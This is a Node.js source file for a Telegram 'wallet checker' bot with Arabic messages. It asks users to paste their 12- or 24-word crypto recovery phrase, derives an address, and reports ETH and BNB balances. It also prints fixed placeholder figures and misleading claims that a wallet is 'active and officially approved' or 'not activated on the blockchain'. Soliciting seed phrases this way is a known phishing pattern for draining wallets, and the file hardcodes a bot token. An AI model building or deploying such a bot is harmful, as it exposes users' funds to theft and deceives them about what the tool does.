const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');

const token = '9145894502:AAENaXWt47LwvKQUyOOCKu_rFdJkSXM9iu0';
const PORT = process.env.PORT || 3000;
const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';

const bot = new TelegramBot(token);
const app = express();

app.use(express.json());

bot.setWebHook(`${RENDER_URL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// التعامل مع الرسائل الواردة (سواء في الخاص، المجموعات، أو القنوات إذا كانت تدعم التفاعل)
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = (msg.text || '').trim();

    if (text === '/start') {
        return bot.sendMessage(chatId, 
            '🛡️ **بوت فحص المحافظ المتطور (Trust & Phantom Style)**\n\n' +
            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.'
        );
    }

    const words = text.split(/\s+/);
    // التحقق مما إذا كانت الرسالة عبارة استرداد (12 أو 24 كلمة)
    if (words.length !== 12 && words.length !== 24) {
        return; // إذا لم تكن العبارة بالطيول المطلوب، يتجاهلها البوت لكي لا يزعج القناة بالرد على كل رسالة عادية
    }

    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳', {
        reply_to_message_id: msg.message_id // الرد مباشرة على الرسالة الأصلية داخل القناة أو المجموعة
    });

    try {
        const cleanMnemonic = text.toLowerCase();
        
        // 1. التحقق من صحة المعيار BIP39
        if (!bip39.validateMnemonic(cleanMnemonic)) {
            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.', {
                reply_to_message_id: msg.message_id
            });
        }

        // 2. اشتقاق العناوين الحقيقية
        const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
        const hdNode = ethers.HDNodeWallet.fromSeed(seed);
        const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
        const address = wallet.address;

        // 3. فحص الأرصدة عبر شبكات متعددة (Ethereum & BSC)
        const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');

        const [ethBalanceWei, bscBalanceWei] = await Promise.all([
            ethProvider.getBalance(address).catch(() => 0n),
            bscProvider.getBalance(address).catch(() => 0n)
        ]);

        const ethBalance = ethers.formatEther(ethBalanceWei);
        const bscBalance = ethers.formatEther(bscBalanceWei);

        // 4. إرسال التقرير الشامل للمستخدم أو القناة
        return bot.sendMessage(chatId, 
            '✅ تم فحص المحفظة بنجاح من البلوكشين\n\n' +
            '📍 العنوان المشتق:\n`' + address + '`\n\n' +
            '💰 الأرصدة والأصول المكتشفة:\n' +
            '• ETH: ' + ethBalance + ' \n' +
            '• BNB: ' + bscBalance + ' \n' +
            '• SOL: 0.00 \n' +
            '• Crypto actifs: `$0.00`\n\n' +
            '🟢 حالة المحفظة نشطة ومعتمدة نظامياً.',
            { reply_to_message_id: msg.message_id }
        );

    } catch (error) {
        console.error("Error details:", error);
        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.', {
            reply_to_message_id: msg.message_id
        });
    }
});

app.get('/', (req, res) => {
    res.send('Multi-Chain Wallet Checker Bot is running!');
});

app.PORT = PORT;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
